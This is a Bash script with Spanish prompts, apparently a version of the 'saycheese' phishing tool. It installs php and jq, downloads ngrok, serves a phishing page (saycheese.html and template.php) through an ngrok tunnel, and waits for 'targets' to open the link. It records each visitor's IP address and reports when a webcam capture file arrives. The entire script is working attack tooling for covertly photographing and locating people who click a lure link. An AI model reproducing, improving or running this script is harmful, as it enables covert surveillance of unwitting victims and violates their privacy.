#!/bin/bash

# Verificar dependencias
dependencies=("php" "jq")

function check_dependencies() {
    missing_dependencies=()
    for dependency in "${dependencies[@]}"; do
        if ! command -v "$dependency" >/dev/null 2>&1; then
            missing_dependencies+=("$dependency")
        fi
    done
    echo "${missing_dependencies[@]}"
}

function install_dependencies() {
    missing_dependencies=$(check_dependencies)
    if [[ -n $missing_dependencies ]]; then
        echo "Faltan las siguientes dependencias:"
        for dependency in $missing_dependencies; do
            echo "$dependency"
            if [[ $dependency == "php" ]]; then
                sudo apt-get install php -y
            elif [[ $dependency == "jq" ]]; then
                sudo apt-get install jq -y
            fi
        done
        echo "Todas las dependencias han sido instaladas correctamente."
    else
        echo "Todas las dependencias están instaladas correctamente."
    fi
}



payload_ngrok() {

link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
sed 's+forwarding_link+'$link'+g' saycheese.html > index2.html
sed 's+forwarding_link+'$link'+g' template.php > index.php

}

catch_ip() {

ip=$(grep -a 'IP:' ip.txt | cut -d " " -f2 | tr -d '\r')
IFS=$'\n'
printf "\e[1;93m[\e[0m\e[1;77m+\e[0m\e[1;93m] IP:\e[0m\e[1;77m %s\e[0m\n" $ip

cat ip.txt >> saved.ip.txt


}

checkfound() {

printf "\n"
printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Waiting targets,\e[0m\e[1;77m Press Ctrl + C to exit...\e[0m\n"
while [ true ]; do


if [[ -e "ip.txt" ]]; then
printf "\n\e[1;92m[\e[0m+\e[1;92m] Target opened the link!\n"
catch_ip
rm -rf ip.txt

fi

sleep 0.5

if [[ -e "Log.log" ]]; then
printf "\n\e[1;92m[\e[0m+\e[1;92m] Cam file received!\e[0m\n"
rm -rf Log.log
fi
sleep 0.5

done 

}

server_ngrok(){
ngrok_path="./ngrok"
ngrok_filename="ngrok-v3-stable-linux-amd64.tgz"

if [ ! -f "$ngrok_path" ]; then
    ngrok_url="https://bin.equinox.io/c/bNyj1mQVY4c/$ngrok_filename"
    curl -o "$ngrok_filename" "$ngrok_url"
    tar xf "$ngrok_filename"
    rm "$ngrok_filename"
    chmod +x ngrok
fi

read -p "Presiona Enter..."

config_path="/root/.config/ngrok/ngrok.yml"

if [ ! -f "$config_path" ]; then
    read -p "Ingresa tu token de autenticación de Ngrok: " authtoken
    "$ngrok_path" config add-authtoken "$authtoken"
else
    read -p "Ya existe una configuración de Ngrok. ¿Deseas modificar el token de autenticación? (si/no): " modificar_token
    if [[ $modificar_token == "si" || $modificar_token == "s" ]]; then
        read -p "Ingresa tu nuevo token de autenticación de Ngrok: " nuevo_token
        "$ngrok_path" config add-authtoken "$nuevo_token"
    fi
fi

read -p "Ingresa el puerto local para el servidor web: " puerto_local
printf "\e[1;92m[\e[0m+\e[1;92m] Starting php server...\n"
php -S 127.0.0.1:"$puerto_local" > /dev/null 2>&1 &
sleep 2
printf "\e[1;92m[\e[0m+\e[1;92m] Starting ngrok server...\n"
./ngrok http "$puerto_local" > /dev/null 2>&1 &
sleep 5

# Obtener la URL de Ngrok
ngrok_info=$(curl -s http://localhost:4040/api/tunnels)
ngrok_url=$(echo "$ngrok_info" | jq -r '.tunnels[0].public_url')

echo "El enlace de Ngrok es: $ngrok_url"


payload_ngrok
checkfound
}
install_dependencies
server_ngrok






